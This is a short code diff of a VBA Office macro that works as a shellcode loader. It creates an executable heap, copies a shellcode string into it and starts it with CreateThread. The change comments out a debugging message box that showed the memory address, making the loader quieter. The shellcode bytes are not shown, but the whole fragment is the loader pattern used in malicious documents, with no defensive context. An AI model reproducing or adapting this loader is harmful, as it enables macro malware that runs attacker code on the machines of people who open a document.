@@ -13,7 +13,7 @@ Public Sub myMacro()
 
     hHeap = HeapCreate(&H40000, 0, 0)
     AllocH = HeapAlloc(hHeap, &H8, Len(sShellCode))
-    MsgBox "Address: " & Hex(AllocH)
+    'MsgBox "Address: " & Hex(AllocH)
 
     RtlMoveMemory AllocH, sShellCode, Len(sShellCode)
     run = CreateThread(0, 0, AllocH, 0, 0, 0)
